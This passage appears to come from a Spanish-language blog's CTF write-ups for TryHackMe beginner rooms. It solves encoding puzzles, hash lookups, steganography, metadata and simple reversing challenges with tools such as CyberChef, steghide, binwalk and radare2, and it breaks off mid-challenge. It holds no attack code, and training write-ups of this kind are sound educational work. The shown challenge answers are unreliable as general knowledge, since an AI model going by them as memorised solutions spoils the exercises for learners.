Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Binary('Space')\u0026amp;input=MDExMDExMDAgMDExMDAxMDEgMDExMTAxMDAgMDExMTAwMTEgMDAxMDAwMDAgMDExMTAxMDAgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMTAwMTEgMDExMDExMTEgMDExMDExMDEgMDExMDAxMDEgMDAxMDAwMDAgMDExMDAwMTAgMDExMDEwMDEgMDExMDExMTAgMDExMDAwMDEgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMDExMTEgMDExMTAxMDEgMDExMTAxMDAgMDAxMDAwMDE #3 Base32 Reto:\nMJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM====== Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',false)\u0026amp;input=TUpRWEdaSlRHSVFHUzRaQU9OMlhBWkxTRUJSVzYzTE5ONVhDQTJMT0VCQlZJUlJIT009PT09PT0 #4 Base64 Reto:\nRWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg== Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=UldGamFDQkNZWE5sTmpRZ1pHbG5hWFFnY21Wd2NtVnpaVzUwY3lCbGVHRmpkR3g1SURZZ1ltbDBjeUJ2WmlCa1lYUmhMZz09 #5 Hex Reto:\n68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Hex('Space')\u0026amp;input=NjggNjUgNzggNjEgNjQgNjUgNjMgNjkgNmQgNjEgNmMgMjAgNmYgNzIgMjAgNjIgNjEgNzMgNjUgMzEgMzYgM2Y #6 Caesar Cipher Reto:\nEbgngr zr 13 cynprf! Decoder - Caesar Cipher\n#7 Rot47 Reto:\n*@F DA:? \u0026gt;6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:\u0026gt;6DX Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=ROT47(47)\u0026amp;input=KkBGIERBOj8gPjYgQzo4OUUgQ0BGPzUgMzIzSiBDOjg5RSBDQEY/NSBXY2YgRTo%2BNkRY #8 Morse Code Reto:\n- . .-.. . -.-. --- -- -- ..- -. .. -.-. .- - .. --- -. . -. -.-. --- -.. .. -. --. Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')\u0026amp;input=LSAuIC4tLi4gLiAtLi0uIC0tLSAtLSAtLSAuLi0gLS4gLi4gLS4tLiAuLSAtIC4uIC0tLSAtLgoKLiAtLiAtLi0uIC0tLSAtLi4gLi4gLS4gLS0u #9 Decimal Reto:\n85 110 112 97 99 107 32 116 104 105 115 32 66 67 68 Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)\u0026amp;input=ODUgMTEwIDExMiA5NyA5OSAxMDcgMzIgMTE2IDEwNCAxMDUgMTE1IDMyIDY2IDY3IDY4 #10 Base64 \u0026gt; Morse Code \u0026gt; Binary \u0026gt; Rot47 \u0026gt; Decimal Reto:\nLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0= Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Morse_Code('Space','Line%20feed')From_Binary('Space')ROT47(47)From_Decimal('Space',false)\u0026amp;input= HASHES #1 MD2 Reto:\n39d4a2ba07e44421c9bedd54dc4e1182 Solucion:\nhttps://md5hashing.net/hash/md2/39d4a2ba07e44421c9bedd54dc4e1182 #2 MD4 Reto:\ne0418e7c6c2f630c71b2acabbcf8a2fb Solucion:\nhttps://md5hashing.net/hash/md4/e0418e7c6c2f630c71b2acabbcf8a2fb #3 MD5 Reto:\nefbd448a935421a54dda43da43a701e1 Solucion:\nhttps://md5hashing.net/hash/md5/efbd448a935421a54dda43da43a701e1 #4 NTLM Reto:\n11FE61CE0639AC2A1E815D62D7DEEC53 Solucion:\nMicrosoft has encryption? #5 SHA512 Reto:\na361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8 Solucion:\nhttps://md5hashing.net/hash/sha512/a361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8 #6 SHA256 Reto:\nd48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f Solucion:\nhttps://md5hashing.net/hash/sha256/d48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f #7 SHA1 Reto:\na34e50c78f67d3ec5d0479cde1406c6f82ff6cd0 Solucion:\nhttps://md5hashing.net/hash/sha1/a34e50c78f67d3ec5d0479cde1406c6f82ff6cd0 SPECTROGRAMS En este reto nos proporcionan un archivo wav, utilizamos Sonic Vizualiser y agregando una capa de Spectrograma logramos ver la flag.\nSTEGANOGRAPHY Utilizamos steghide para extraer los archivos contenidos dentro de la imagen.\n1 2 3 4 5 6 7 8  ➜ capture_the_flag steghide extract stegosteg.jpg steghide: unknown argument \u0026#34;stegosteg.jpg\u0026#34;. steghide: type \u0026#34;steghide --help\u0026#34; for help. ➜ capture_the_flag steghide extract -sf stegosteg.jpg Enter passphrase: wrote extracted data to \u0026#34;steganopayload2248.txt\u0026#34;. ➜ capture_the_flag cat steganopayload2248.txt Spa[... snip ...]teg%   SECURITY THROUGH OBSCURITY En este reto nos proporcionan una imagen en la que se aplica nuevamente esteganografia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ➜ capture_the_flag binwalk meme.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 74407 0x122A7 RAR archive data, version 5.x 74478 0x122EE PNG image, 147 x 37, 8-bit/color RGBA, non-interlaced 74629 0x12385 Zlib compressed data, default compression ➜ capture_the_flag binwalk meme.jpg -e DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 WARNING: Extractor.execute failed to run external extractor \u0026#39;unrar e \u0026#39;%e\u0026#39;\u0026#39;: [Errno 2] No such file or directory: \u0026#39;unrar\u0026#39;: \u0026#39;unrar\u0026#39;, \u0026#39;unrar e \u0026#39;%e\u0026#39;\u0026#39; might not be installed correctly WARNING: Extractor.execute failed to run external extractor \u0026#39;unrar -x \u0026#39;%e\u0026#39;\u0026#39;: [Errno 2] No such file or directory: \u0026#39;unrar\u0026#39;: \u0026#39;unrar\u0026#39;, \u0026#39;unrar -x \u0026#39;%e\u0026#39;\u0026#39; might not be installed correctly 74407 0x122A7 RAR archive data, version 5.x 74478 0x122EE PNG image, 147 x 37, 8-bit/color RGBA, non-interlaced 74629 0x12385 Zlib compressed data, default compression   Extraemos el archivo rar.\n1 2 3 4 5 6 7 8 9 10 11  ➜ _meme.jpg.extracted unrar e 122A7.rar UNRAR 5.50 freeware Copyright (c) 1993-2017 Alexander Roshal Extracting from 122A7.rar Extracting hackerchat.png OK All OK ➜ _meme.jpg.extracted ls 122A7.rar 12385 12385.zlib hackerchat.png   Utilizamos Strings para ver nuestra flag en la nueva imagen.\n1 2 3 4 5 6 7 8 9 10 11 12  ➜ _meme.jpg.extracted strings hackerchat.png| tail \u0026#39;[SQP S~j@6h vA}= *s\u0026amp;__ @9Xs {@84 2$Es i2Mc IEND \u0026#34;AHH_[... snip ...]_ME!\u0026#34; ➜ _meme.jpg.extracted   ","description":"C4ptur3-th3-fl4g es una sala de TryHackMe que presenta una serie de retos, utilizamos CyberChef y herramientas en Linux para encontrar la solucion de cada uno de los retos.","id":110,"section":"posts","tags":["cyberchef","steganography","binwalk"],"title":"TryHackMe - c4ptur3-th3-fl4g","uri":"https://sckull.github.io/posts/c4ptur3-th3-fl4g/"},{"content":"  CTF collection Vol.1 es una serie de retos de Esteganografia, Reversing, Analisis de Codigo, OSINT like.\nRoom    Titulo CTF collection Vol.1      Descripción Sharpening up your CTF skill with the collection. The first volume is designed for beginner.   Puntos 700   Dificultad Facil   Maker DesKel     What does the base said? Can you decode the following?\nReto:\n1  VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==   Reto:\n1  Base64   Meta meta Solucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  ➜ ctf_collection_vol1 exiftool Findme.jpg ExifTool Version Number : 10.80 File Name : Findme.jpg Directory : . File Size : 34 kB File Modification Date/Time : 2020:02:12 17:29:21-06:00 File Access Date/Time : 2020:02:12 17:29:54-06:00 File Inode Change Date/Time : 2020:02:12 17:29:49-06:00 File Permissions : rw-rw-r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 X Resolution : 96 Y Resolution : 96 Exif Byte Order : Big-endian (Motorola, MM) Resolution Unit : inches Y Cb Cr Positioning : Centered Exif Version : 0231 Components Configuration : Y, Cb, Cr, - Flashpix Version : 0100 Owner Name : THM{... snip ...} Comment : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 60. Image Width : 800 Image Height : 480 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 800x480 Megapixels : 0.384 ➜ ctf_collection_vol1   Mon, are we going to be okay? Something is hiding. That\u0026rsquo;s all you need to know.\nSolucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  ➜ ctf_collection_vol1 steghide info Extinction.jpg \u0026#34;Extinction.jpg\u0026#34;: format: jpeg capacity: 1.3 KB Try to get information about embedded data ? (y/n) ➜ ctf_collection_vol1 steghide info Extinction.jpg \u0026#34;Extinction.jpg\u0026#34;: format: jpeg capacity: 1.3 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;Final_message.txt\u0026#34;: size: 79.0 Byte encrypted: rijndael-128, cbc compressed: yes ➜ ctf_collection_vol1 steghide extract -sf Extinction.jpg Enter passphrase: wrote extracted data to \u0026#34;Final_message.txt\u0026#34;. ➜ ctf_collection_vol1 cat Final_message.txt It going to be over soon. Sleep my child. THM{... snip ...} ➜ ctf_collection_vol1   Erm\u0026hellip;\u0026hellip;Magick Huh, where is the flag?\nSolucion:\nQRrrrr Such technology is quite reliable.\nSolucion:\nReverse it or read it? Solucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  ➜ ctf_collection_vol1 r2 hello.hello [0x00001060]\u0026gt; aaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze len bytes of instructions for references (aar) [x] Analyze function calls (aac) [x] Use -AA or aaaa to perform additional experimental analysis. [x] Constructing a function name for fcn.* and sym.func.* functions (aan) [0x00001060]\u0026gt; afl 0x00001000 3 23 sym._init 0x00001030 1 6 sym.imp.puts 0x00001040 1 6 sym.imp.printf 0x00001050 1 6 sub.__cxa_finalize_248_50 0x00001060 1 43 entry0 0x00001090 3 33 sym.deregister_tm_clones 0x000010c0 3 50 sym.register_tm_clones 0x00001100 4 49 sym.__do_global_dtors_aux 0x00001140 1 5 entry1.init 0x00001145 1 24 sym.skip 0x0000115d 1 23 sym.main 0x00001180 4 93 sym.__libc_csu_init 0x000011e0 1 1 sym.__libc_csu_fini 0x000011e4 1 9 sym._fini [0x00001060]\u0026gt; pdf @sym.skip / (fcn) sym.skip 24 | sym.skip (); | 0x00001145 55 push rbp | 0x00001146 4889e5 mov rbp, rsp | 0x00001149 488d3db80e00. lea rdi, qword str.THM_345y_f1nd_345y_60 ; 0x2008 ; \u0026#34;THM{... snip ...}\u0026#34; | 0x00001150 b800000000 mov eax, 0 | 0x00001155 e8e6feffff call sym.imp.printf ; int printf(const char *format) | 0x0000115a 90 nop | 0x0000115b 5d pop rbp \\  0x0000115c c3 ret [0x00001060]\u0026gt;   Another decoding stuff Can you decode it?\nReto:\n1  3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4L   Solucion:\nLeft or right Left, right, left, right\u0026hellip; Rot 13 is too mainstream. Solve this\nReto:\n1  MAF{atbe_max_vtxltk}   Solucion:\nMake a comment No downloadable file, no ciphered or encoded text. Huh \u0026hellip;\u0026hellip;.\nSolucion:\nCan you fix it? I accidentally messed up with this PNG file. Can you help me fix it? Thanks, ^^\nPasamos el archivo a Hexadecimal, editamos el archivo y reemplazamos la cantidad de \u0026ldquo;magic numbers\u0026rdquo; de un archivo PNG, luego de esto podemos obtener nuestra imagen renderizando la con CyberChef.\nReto:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  ➜ ctf_collection_vol1 xxd -p spoil.png \u0026gt; spoil_hex_data ➜ ctf_collection_vol1 head spoil head: cannot open \u0026#39;spoil\u0026#39; for reading: No such file or directory ➜ ctf_collection_vol1 head spoil_hex_data 2333445f0d0a1a0a0000000d4948445200000320000003200806000000db 700668000000017352474200aece1ce9000000097048597300000ec40000 0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9 752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20 0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea 57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740 4444444444660e0510111111111119370a202222222222326e1440444444 444464dc28808888888888c8b8510011111111119171a300222222222222 e34601444444444444c68d028888888888888c1b0510111111111119370a ➜ ctf_collection_vol1 vim spoil_hex_data ➜ ctf_collection_vol1 head spoil_hex_data 89504E470D0A1A0A0000000d4948445200000320000003200806000000db 700668000000017352474200aece1ce9000000097048597300000ec40000 0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9 752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20 0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea 57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740 4444444444660e0510111111111119370a202222222222326e1440444444 444464dc28808888888888c8b8510011111111119171a300222222222222 e34601444444444444c68d028888888888888c1b0510111111111119370a ➜ ctf_collection_vol1   Solucion:\nRead it Some hidden flag inside Tryhackme social account.\nSolucion:\nSpin my head What is this?\nReto:\n1  